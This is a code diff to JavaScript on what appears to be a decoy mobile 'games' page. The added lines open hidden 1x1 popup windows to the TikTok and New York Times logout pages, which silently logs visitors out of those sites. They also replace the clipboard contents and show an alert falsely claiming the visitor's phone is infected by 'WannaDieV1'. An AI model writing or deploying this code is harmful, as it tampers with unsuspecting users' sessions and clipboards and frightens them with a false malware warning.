@@ -214,9 +214,7 @@ let myWindow;
 
   myWindow.close();
  
-    navigator.clipboard.writeText("Dam It Your Iphone Or Any Mobile Phone, Has Been Infected By WannaDieV1 The Damaged Has Been Already Made...");
-  
-
+ 
     setTimeout(() => {
         let myWindow;
   myWindow = window.open("https://www.tiktok.com/logout?redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fen%2F", "_Blank", "width=1,height=1");
@@ -238,7 +236,20 @@ let myWindow;
   myWindow.close();
       }, 1000)
 
+      setTimeout(() => {
+        let myWindow;
+  myWindow = window.open("https://myaccount.nytimes.com/auth/logout", "_Blank", "width=1,height=1");
+
+  myWindow.close();
+      }, 1000)
   
+
+      navigator.clipboard.writeText("Dam It Your Iphone Or Any Mobile Phone, Has Been Infected By WannaDieV1 The Damaged Has Been Already Made...");
+  alert("Your Iphone Or Any Mobile Device, Has Been Infected By WannaDieV1")
+
+
+
+
 }else{
 alert("you can only play games on mobile");
 let myWindow;
